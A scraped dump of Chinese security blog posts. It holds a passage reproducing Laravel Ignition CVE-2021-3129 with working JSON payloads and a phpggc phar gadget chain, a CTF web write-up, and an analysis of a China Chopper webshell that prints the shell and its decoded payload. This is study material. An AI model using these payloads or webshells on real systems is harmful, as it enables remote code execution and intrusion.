1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;suiyi&quot;,&quot;viewFile&quot;:&quot;php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log&quot;&#125;&#125; 最终发现base64过滤器各种直接用不上，但问题不大，这里记得他的一个特性，如果不存在 = 号，他可以帮助我们去掉非base64编码后的字符。 3.4 考虑其他 filter 过滤器清空文件除了使用 base64-decode过滤器，也可以使用，而且不会受到特殊符号的影响 1php://filter/read=consumed/resource=../storage/logs/laravel.log Emm，不过就是不知道这个 filter 是如何发现的。。网上找了半天没找到 至此，上面的问题还是没有解决 问题在于，如何在存在[prefix] [midfix1] [midfix2] [suffix] 的情况下，如何让可控PAYLOAD被利用？ 来硬的不行，换个思路，假设可以让[prefix] [midfix1] [midfix2] [suffix]转换为不可见字符，保留 PAYLOAD 部分为可见字符，然后结合PHP base64 解码的特性，是不是就可以只保留 PAYLOAD 部分了？ 好像还真可以，利用filter过滤器把日志内容识别为 UTF-16 编码，并转换为 UTF-8编码，因为 UTF-16 是双字节编码，那么原有的 [prefix] 是否就全变为不可见字符？ 参考官方例子 PHP: Conversion Filters - Manual 1234567&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.iconv.utf-16le.utf-8&#x27;);fwrite($fp, &quot;T\\0h\\0i\\0s\\0 \\0i\\0s\\0 \\0a\\0 \\0t\\0e\\0s\\0t\\0.\\0\\n\\0&quot;);fclose($fp);/* Outputs: This is a test. */?&gt; 然后 PAYLOAD 部分，输入 P\\0A\\0Y\\0L\\0O\\0A\\0D\\0 ，写入时指定 utf16le -&gt; utf-8 1php://filter/write=convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log 转换为 UTF-8 刚刚好为 PAYLAOD，最后在 base64解码一下，刚刚好只剩下 PAYLOAD 部分。赶紧试试，太骚了这思路。 发现写不进去。。仔细想想，\\0 在PHP是阶段，会报错，也难怪，而且到时候 file_get_contets() 的时候，也会报错。 这里又需利用到另外一个过滤器 https://www.php.net/manual/en/filters.convert.php#filters.covert.quoted-printable 我们可以先把 \\0 编码为 =00，读取的时候解码即可。 先写入PAYLOAD，这里为 1t=00a=00r=00i=00 然后写入，先解码 =00 然后在把utf16转换为utf8 1php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/resource=../storage/logs/laravel.log 又报错了，utf16要求双字节对齐，但日志文件来说，不一定是双字节对齐。处理方法很简单，任何数*2都是偶数，就双字节对齐啦，如变成下面这样 12[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix][prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix] 赶紧尝试一下 （ 不出意外，又报错了 找了半天，原来PAYLOAD被部分截断了，然后截断的位置非常神奇，并且加了个点 =0.，导致解码错误， 写个小demo，果然如此 即我们的部分PAYLOAD导致出了问题 1[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2]部分PAYLOAD[suffix] 这个容易解决，查看日志文件，数一下发现只会截断前15个，我们这里填充个100个随意字符，这里选择填充A，怎么也不会殃及到我们的PAYLOAD 也就是说，我们现在不用关心部分PAYLOAD了，现变为 12[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix][prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix] 先清空日志，然后发两次 转换 nice~ 特殊字符用base64编码去特殊字符就行，当然我们的 tari 没有进行base64编码，所以直接base64解码，特殊字符是去掉了，不过我们的 tari 也会被解码为乱码 12echo &quot;tari&quot; | base64 | sed -E &#x27;s/./&amp;\\=00/g&#x27; # 输出 d=00G=00F=00y=00a=00Q=00o=00==00 看到了熟悉的有问题的子串 ==00 号，就和我们日志里出现的 =0. 类似，都会有问题 这里有两个方法 编码 =，即编码为 =3D base64编码后，把=号去掉，因为PHP的base64解码发现位数不为4的整数倍，会自动在后方加 = 号，这点在3.3小节说过 这里选择第2种方法 12echo &quot;tari&quot; | base64 | sed -E &#x27;s/=+$//g&#x27; | sed -E &#x27;s/./&amp;\\=00/g&#x27;# 输出 d=00G=00F=00y=00a=00Q=00o=00 3.5 两个PAYLOAD和双字节对齐但是这样还有个问题，就是我们的 PAYLOAD 出现了两次，处理方法很简单，把原来的 12[prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix][prefix]PAYLOAD[midfix1]PAYLOAD[midfix2][suffix] 转换为 12[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix][prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix] 其中 PAYLOAD_1随意即可，无需为真的PAYLOAD，比如我们可以把 PAYLOAD_1 变为保持为100个 &#39;A&#39; ，因为没有 \\0 ，所以从utf16转换为utf-8会把他转换为”乱码” 到这里可能会有所疑问，我们的 PAYLOAD_2 不是也出现了两次么？ 1[prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix] 这里也挺巧妙的，一开始我们是清空了日志的，这时我们的日志文件 laravel.log 文件为空。 PAYLOAD_1 和 PAYLOAD_2 前面都填充了 100个 A，所以 [midfix1][midfix2][suffix]部分是一样的，而且是不会变的。 首先看看整体是不是双字节对齐的 ==证明1：== PAYLOAD_1 是偶数，已对齐； 2个[prefix][midfix1][midfix2][suffix] 是一样的，无论奇偶与否，乘以2都是偶数，对齐； PAYLOAD_2也是有两个，对齐； 所以整体肯定是对齐的。不然过滤器 convert.iconv.utf-16le.utf-8 无法正常工作。 ==证明1证毕== 接下来考虑顺序问题，会不会因 奇数+P\\0A\\0 刚好把我们精心构造的PAYLOAD给破坏了呢？ 我们发的第一个填充包，整体可能是奇数，也可能是偶数，，接下来分两种情况分别讨论 前提 [prefix] 长度为 53，为奇数，这里应该都是一样的，尝试过使用内网其他机器访问，也是 local.ERROR 1[2021-06-07 07:52:32] local.ERROR: file_get_contents( midfix1 长度为 119，为奇数 1): failed to open stream: No such file or directory &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents( 设定 Si 表示串下标为 i 之前的子串 当第1个填充包为奇数 由证明1知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为奇数 Si = 第1个填充包（奇数） + 第二个包的[prefix]部分（奇数） -&gt; 偶数 此时没有破坏 第1个PAYLOAD_2 然后 [midfix2]的长度 Si+1是奇数，此时 Si+1 + P\\0A\\0 肯定会破坏第2个PAYLOAD_2，也就是说这部分经转换为乱码 因为此前都是偶数，[midfix2] 到最后肯定也是偶数，不会破坏双字节对齐 最终输出的为，base64_decode(乱码+第1个PAYLOAD_2+乱码)，就仅有 PAYLOAD_2 因此这种情况最终只有1个我们构造的PAYLOAD，符合条件 当第一个填充包为偶数 由证明1知，我们发的2个包肯定是双字节对齐，也就是偶数，那么此时第2个填充包肯定也为偶数 Si+2 = 第1个填充包（偶数） + 第二个包的[prefix]部分（奇数） -&gt; 奇数， Si+2 （奇数） + P\\0A\\0 肯定会破坏第1个PAYLOAD_2，这部分都为乱码，不用理会 此时 Si+3 = Si+2 （奇数） + 第1个PAYLOAD_2（偶数） -&gt; 奇数 然后Si+4 = Si+3（奇数） + [midfix2] （奇数） -&gt; 偶数 Si+4（偶数）并不会破坏 第二个PAYLOAD_2 的结构， Si+4（偶数）+ 第二个PAYLOAD_2 (偶数) -&gt; 偶数，所以后面也为偶数，不会破坏双字节对齐 最终输出的为，base64_decode(乱码+第2个PAYLOAD_2+乱码)，就仅有 PAYLOAD_2 因此这种情况最终只有1个我们构造的PAYLOAD，符合条件 综上 下面这种构造方法 12[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix][prefix]PAYLOAD_2[midfix1]PAYLOAD_2[midfix2][suffix] [prefix] 和 [midfix1] 都为奇数， 且 PAYLOAD_1 为长度偶数，最终可以安全的得到一个 PAYLOAD_2 另外一种情形 因为包的 [prefix] 和 [midfix1] 部分刚好都为奇数，所以是这样。 如果是其他情况呢，假设 [prefix] 和 [midfix1] 是前奇后偶的情况？ 这个和实际利用情况很像，因为如果file_get_contents 输入的参数过长，[midfix1] 会变成 1): failed to open stream: Invalid argument &#123;&quot;exception&quot;:&quot;[object] (ErrorException(code: 0): file_get_contents( 长度是 110 就需要在我们想要的PAYLOAD最后填充 =00，就可以了，因为这样无论第1个或第2个PAYLOAD前面是奇数还是偶数，首先双字节一定是对齐的，然后第1个PAYLOAD前是奇数，会吃掉第1个PAYLOAD，又因PAYLOAD后有一个=00 会吃掉后面一个字符，这样就变成了偶数，所以第二个不会被吃，反则反之。 所以前奇后偶的情况是这样 12[prefix]PAYLOAD_1[midfix1]PAYLOAD_1[midfix2][suffix][prefix]PAYLOAD_2=00[midfix1]PAYLOAD_2=00[midfix2][suffix] 因为第1个payload前只有奇数或偶数两种情况，所以考虑这两种情况足以。 那么针对这两种情况，有没有通用的解决方法呢？（我暂没发现。。 3.6 整合 清空日志 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;&#125;&#125; 写入填充数据 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;&#125;&#125; 写入我们可控数据 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd=00G=00F=00y=00a=00Q=00o=00&quot;&#125;&#125; 这里Payload字段比较短，为双奇数型，不需要处理 如果比较长，比如真实漏洞利用，一般为前奇后偶型，需要在PAYLOAD后缀加上 =00 保证对齐 转换去除无关数据 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;&#125;&#125; OK，终于可控了~ 4. 漏洞利用4.1 手工利用4.1.1 清空日志 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;php://filter/read=consumed/resource=../storage/logs/laravel.log&quot;&#125;&#125; 4.1.2 写入填充对齐数据 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;&#125;&#125; 4.1.3 生成并写入 phar payload 4.1.3.1 生成phar payload 1php -d &#x27;phar.readonly=0&#x27; ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output | base64 -b0 | sed -E &#x27;s/=+$//g&#x27; | sed -E &#x27;s/./&amp;=00/g&#x27; 4.1.3.2 写入phar payload 数据 (4.1.3.1 生成的) 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00r=00Z=00A=00g=00A=00A=00A=00g=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00C=00C=00A=00g=00A=00A=00T=00z=00o=00z=00M=00j=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00F=00N=005=00c=002=00x=00v=00Z=001=00V=00k=00c=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00E=006=00e=003=00M=006=00O=00T=00o=00i=00A=00C=00o=00A=00c=002=009=00j=00a=002=00V=000=00I=00j=00t=00P=00O=00j=00I=005=00O=00i=00J=00N=00b=002=005=00v=00b=00G=009=00n=00X=00E=00h=00h=00b=00m=00R=00s=00Z=00X=00J=00c=00Q=00n=00V=00m=00Z=00m=00V=00y=00S=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=006=00N=00z=00p=007=00c=00z=00o=00x=00M=00D=00o=00i=00A=00C=00o=00A=00a=00G=00F=00u=00Z=00G=00x=00l=00c=00i=00I=007=00T=00z=00o=00y=00O=00T=00o=00i=00T=00W=009=00u=00b=002=00x=00v=00Z=001=00x=00I=00Y=00W=005=00k=00b=00G=00V=00y=00X=00E=00J=001=00Z=00m=00Z=00l=00c=00k=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=00j=00c=006=00e=003=00M=006=00M=00T=00A=006=00I=00g=00A=00q=00A=00G=00h=00h=00b=00m=00R=00s=00Z=00X=00I=00i=00O=000=004=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00U=002=00l=006=00Z=00S=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00k=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00i=00I=007=00Y=00T=00o=00x=00O=00n=00t=00p=00O=00j=00A=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00w=00a=00H=00B=00p=00b=00m=00Z=00v=00I=00j=00t=00z=00O=00j=00U=006=00I=00m=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=001=009=00c=00z=00o=004=00O=00i=00I=00A=00K=00g=00B=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00p=00b=00m=00l=000=00a=00W=00F=00s=00a=00X=00p=00l=00Z=00C=00I=007=00Y=00j=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00k=00x=00p=00b=00W=00l=000=00I=00j=00t=00p=00O=00i=000=00x=00O=003=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00H=00B=00y=00b=002=00N=00l=00c=003=00N=00v=00c=00n=00M=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00Y=003=00V=00y=00c=00m=00V=00u=00d=00C=00I=007=00a=00T=00o=00x=00O=003=00M=006=00M=00T=00Q=006=00I=00m=00N=00h=00b=00G=00x=00f=00d=00X=00N=00l=00c=00l=009=00m=00d=00W=005=00j=00I=00j=00t=009=00f=00X=00M=006=00M=00T=00M=006=00I=00g=00A=00q=00A=00G=00J=001=00Z=00m=00Z=00l=00c=00l=00N=00p=00e=00m=00U=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=005=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00I=00i=00O=002=00E=006=00M=00T=00p=007=00a=00T=00o=00w=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=003=00M=006=00N=00z=00o=00i=00c=00G=00h=00w=00a=00W=005=00m=00b=00y=00I=007=00c=00z=00o=001=00O=00i=00J=00s=00Z=00X=00Z=00l=00b=00C=00I=007=00T=00j=00t=009=00f=00X=00M=006=00O=00D=00o=00i=00A=00C=00o=00A=00b=00G=00V=002=00Z=00W=00w=00i=00O=000=004=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00a=00W=005=00p=00d=00G=00l=00h=00b=00G=00l=006=00Z=00W=00Q=00i=00O=002=00I=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00I=00A=00K=00g=00B=00i=00d=00W=00Z=00m=00Z=00X=00J=00M=00a=00W=001=00p=00d=00C=00I=007=00a=00T=00o=00t=00M=00T=00t=00z=00O=00j=00E=00z=00O=00i=00I=00A=00K=00g=00B=00w=00c=00m=009=00j=00Z=00X=00N=00z=00b=003=00J=00z=00I=00j=00t=00h=00O=00j=00I=006=00e=002=00k=006=00M=00D=00t=00z=00O=00j=00c=006=00I=00m=00N=001=00c=00n=00J=00l=00b=00n=00Q=00i=00O=002=00k=006=00M=00T=00t=00z=00O=00j=00E=000=00O=00i=00J=00j=00Y=00W=00x=00s=00X=003=00V=00z=00Z=00X=00J=00f=00Z=00n=00V=00u=00Y=00y=00I=007=00f=00X=001=009=00B=00Q=00A=00A=00A=00G=00R=001=00b=00W=001=005=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00C=00A=00A=00A=00A=00H=00R=00l=00c=003=00Q=00u=00d=00H=00h=000=00B=00A=00A=00A=00A=00D=00w=00d=00v=002=00A=00E=00A=00A=00A=00A=00D=00H=005=00/=002=00K=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00d=00G=00V=00z=00d=00H=00R=00l=00c=003=00R=00P=00k=00R=00y=00Q=00r=00k=00B=00t=00D=007=001=003=00E=00z=00J=00P=00B=00n=00I=00w=00c=00c=00v=00F=00o=00A=00I=00A=00A=00A=00B=00H=00Q=00k=001=00C=00=00&quot;&#125;&#125; 因为payload比较长，所以是前奇后偶型，注意别忘了在最后还要补上一个 =00 这里已经补上了 4.1.4 把日志文件转换为仅剩phar数据 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;&#125;&#125; 4.1.5 通过file_get_contents触发phar反序列化 1&#123;&quot;solution&quot;:&quot;Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution&quot;,&quot;parameters&quot;:&#123;&quot;variableName&quot;:&quot;username&quot;,&quot;viewFile&quot;:&quot;phar:///Users/tari/Sites/laravel/storage/logs/laravel.log/test.txt&quot;&#125;&#125; 注意这里的路由必须为绝对路径（相对路径试过了会报错） 不过绝对路径也是已知的，可以通过报错信息获取~ 4.2 脚本利用改进了一下原有脚本，可以兼容laravel的artisan serv 和 apache代理（路由后面少个 /）启动模式 测试PHP版本为 PHP7.3.24 cve-2021-3129.py PHP 8 用不了，可能是因为 monolog 的gadget有问题 总结本次漏洞踩了的坑很多 在 base64过滤器里，理解了挺久一些字符串还原特性[5]的，然后清空中过滤器与base64_decode函数不同的坑也踩了，原来过滤器中，中间不能用 = 号。顺便深入理解了baes64编码的原理，解码的条件。 了解了PHP伪协议一些不太常见的过滤器，原来还可以联合起来，配合报错日志这样玩，，这样构造仅有我们想要的内容 在字节对齐这理解了很久，也是有 = 号产生的坑，做了很多不同实验踩才理解透彻 虽然 虽然漏洞点不在很深的位置，但是不明显，file_get_contents 和 file_put_contents 都绑定了，当时打ctf遇到这个确实没啥好的思路。 虽然花了几天复现这个漏洞，不过学了很多新的东西，也对旧的知识（base64、phar等）做了巩固和更深入的理解和应用。 参考链接[1] NVD - CVE-2021-3129 (nist.gov) [2] Unauthenticated remote code execution in Ignition · CVE-2021-3129 · GitHub Advisory Database [3] Laravel Debug模式下远程代码执行漏洞分析 - 知乎 (zhihu.com) [4] Laravel &lt;= v8.4.2 debug mode: Remote code execution (ambionics.io) [5] Orange: HITCON CTF 2018 - One Line PHP Challenge [6] 漏洞分析 | Laravel Debug页面RCE（CVE-2021-3129）分析复现 (qq.com)","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"ignition","slug":"漏洞复现/ignition","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ignition/"},{"name":"Laravel8","slug":"漏洞复现/ignition/Laravel8","permalink":"https://tari.moe/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ignition/Laravel8/"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://tari.moe/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"ignition","slug":"ignition","permalink":"https://tari.moe/tags/ignition/"},{"name":"Laravel8","slug":"Laravel8","permalink":"https://tari.moe/tags/Laravel8/"}]},{"title":"Web writeup | 2021年第一届广东大学生网络安全攻防大赛-晋级赛","slug":"2021/2021gd-university-ctf","date":"2021-05-23T10:12:33.000Z","updated":"2021-08-12T15:53:01.455Z","comments":true,"path":"/p/2021/2021gd-university-ctf/","link":"","permalink":"https://tari.moe/p/2021/2021gd-university-ctf/","excerpt":"","text":"前言实力吐槽这次比赛 初赛环境老是炸，最后30多分钟都炸了，答案都提交不了 晋级塞，，题目也偶尔会出现断开的问题，，第二个web题，，竟然一开始直接返回空，后来又可以了？？不知道是不是只有我遇到这个问题，，晕 而且，，晋级赛竟然不是uuid式动态flag。。。。？ old 任意文件读取，不过flag.txt 读不了，但可以看 hint.txt，smali 字节码，提示了 fastjson 1.2.24 先读取本进程相关目录 在 /usr/local/run/start.jar 获取源码，IDEA打开分析 原来过滤了 flag ，怪不得读取不了 往反序列化方向，不过有waf 然后还有限制 这里卡了挺久，试了网上很多EXP，都不行 然后突然想起fastjson反序列化的原理 一般是需要别的库的配合，通过反射获取相关方法的 于是我一个个依赖找 搜了下 spring ，没有相关漏洞，但是在 tomcat dbcp 里刚好发现了可以利用，而且不用利用 rmi ldap 之类的 https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html 然后刚好用到 BCEL，HFCTF2021也刚好用到， 刚好复现过了，所以非常熟练 （ https://github.com/f1tz/BCELCodeman 编写 java poc，转换为 class 然后生成 BCEL 码 这样可以绕过waf的黑名单，即绕过了第1个challenge 还有2个 challenge，这个简单，就长度大于2000，然后需要包含 flag 关键字 这里直接把 /flag.txt 改一下名读取即可 try_js审计源码 你要merge，那我可就不困了，明显的原型连污染 污染一下原型 即可成功登录 接下来，就没有然后了，， 除了输入黑名单以外的东西，都是直接断开连接，晕 emm 快结束了，，环境就可以了？？？ 先fuzz .DS_Store 是mac的备份文件，有的小伙伴应该遇到过，就解压了mac的压缩包，莫名其妙多了这个文件 通过 shellme.php 得知 flag 在 /var/www/flag 然后通过 y0u_w1ll_s3e_Me.txt 知道源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpclassname = &quot;SayHi&quot;; $this-&gt;param = array(&quot;C&quot;, &quot;T&quot;, &quot;F&quot;, &quot;E&quot;, &quot;R&quot;); $tmp = new $this-&gt;classname($this-&gt;param); &#125; public function __destruct() &#123; if (strpos($this-&gt;param, &#x27;flag&#x27;) !== false || strpos($this-&gt;param, &#x27;?&#x27;) !== false || strpos($this-&gt;param, &#x27;*&#x27;) !== false) &#123; die(&#x27;You want to hack me?&#x27;); &#125; else &#123; $text = new $this-&gt;classname($this-&gt;param); foreach ($text as $t) &#123; echo ($t); &#125; &#125; &#125; public function __wakeup() &#123; $this-&gt;checkMethod = new Check; if ($this-&gt;checkMethod-&gt;vaild($this-&gt;param) &amp;&amp; $this-&gt;checkMethod-&gt;vaild($this-&gt;class)) &#123; echo (&quot;You are a good man!&quot;); &#125; else &#123; die(&#x27;You are a hacker?&#x27;); &#125; &#125; &#125; class SayHi &#123; public $a; public function __construct($a) &#123; $this-&gt;a = $a; array_push($this-&gt;a, &quot;HELLO&quot;); return $this-&gt;a; &#125; &#125; class Check &#123; public function vaild($code) &#123; $pattern = &#x27;/[flag|file|!|@|#|$|%|^|&amp;|*|=|\\&#x27;|&quot;|:|;|?]/i&#x27;; if (preg_match($pattern, $code)) &#123; return false; &#125; else &#123; return true; &#125; &#125; &#125; if (isset($_GET[&#x27;p&#x27;])) &#123; unserialize($_GET[&#x27;p&#x27;]); &#125; else &#123; $v = new Verify; &#125; 也就是 y0u_w1ll_s3e_Me.php 的源码 就反序列化，，亿下，，就可以了，但时间不够了，，晕","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctf比赛","slug":"ctf/ctf比赛","permalink":"https://tari.moe/categories/ctf/ctf%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctf比赛","slug":"ctf比赛","permalink":"https://tari.moe/tags/ctf%E6%AF%94%E8%B5%9B/"}]},{"title":"面白i安全小记 | 中国菜刀之连不上的奇怪马","slug":"2021/fun-cyber-sec-1","date":"2021-05-17T15:32:51.000Z","updated":"2022-02-01T04:23:54.665Z","comments":true,"path":"/p/2021/fun-cyber-sec-1/","link":"","permalink":"https://tari.moe/p/2021/fun-cyber-sec-1/","excerpt":"","text":"本栏目前言以前总是和别人一起研究过许多平常没咋注意，但是又非常有意思的小姿势，然后弄完后，但过了许久不用细节可能就忘的差不多了。所以想着开了个小栏目来记录一下一些我平常没咋注意到的、有趣的安全相关内容，可能更新也不是特别的频繁，毕竟不是天天都能遇到这些奇奇怪怪的点的，哈哈。 不过栏目的初衷是：在接触新东西时，遇到不理解或者感觉理解不透彻的，可以给自己或别人解答一波，顺便记录一下，以后可以回来看看，感觉挺有意思。 就感觉一般我们在学习新东西的时候，都是充满好奇心的，总是好奇这好奇那，这理解起来怪怪的，那不懂，现在有了点基础，自己遇到或别人问到了相关的，以前没注意到的，没能回答上来的，没能很理解的，也可以研究分析一波原理，感觉挺有趣的，所以栏目名称是有趣的安全小记 （ 正题这要和一个在备考 PTE 的同学说起，这是3月份的事情了（之前为了解释清楚写了个文档，一直在语雀扔着） 这个菜刀连接马长这样的 123456&lt;?php @$a = $_POST[&#x27;Hello&#x27;]; if(isset($a))&#123; @preg_replace(&quot;/\\[(.*)\\]/e&quot;,&#x27;\\\\1&#x27;,base64_decode(&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;)); &#125; ?&gt; 不过他说连不上，我就奇怪了，你们老师发的马竟然连不上，不应该呀。。 然后和他激烈的讨论了一波，无果 回到宿舍分析了一波，首先看马的主要函数 preg_replace 第一个参数表示匹配的模式，这里是匹配 [(.*)] 里的内容， /e 表示把第二个参数里的内容当作php代码来解析 第三个参数base64解码为 [@eval(base64_decode($_POST[z0]));] 第二个参数 \\\\1 在正则表达式里表示匹配的第一个括号中的内容 因此 1@preg_replace(&quot;/\\[(.*)\\]/e&quot;,&#x27;\\\\1&#x27;,base64_decode(&#x27;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=&#x27;)); 表示 1@eval(base64_decode($_POST[z0])); 那为什么密码是 Hello 呢，来观察一下中国菜刀连接的包， https://github.com/raddyfiy/caidao-official-version 2016 版本不行，抓包后发现，连接机制不一样… 2014 版本可以正常连接 2011版本也可以正常连接，看包也更直观看出，2333 以 2014版本为例，wireshark 抓包 可以看到菜刀，无论你密码是啥，密码参数只是跳板，他会传入一些值，然后上面我们感到疑惑的马 if 不为空即可过，然后 z0 才是真正的马。base解码后为 1@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=dirname(__FILE__);$R=&quot;&#123;$D&#125;\\t&quot;;if(substr($D,0,1)!=&quot;/&quot;)&#123;foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;$R.=&quot;\\t&quot;;$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();$R.=php_uname();$R.=&quot;(&#123;$usr&#125;)&quot;;print $R;;echo(&quot;|&lt;-&quot;);die(); 平常我们的木马是类似于这样的 1&lt;?php eval($_POST[&#x27;abc&#x27;]); ?&gt; 我们传入的密码是 abc ，其实他是会把 abc 传入的东西 eval 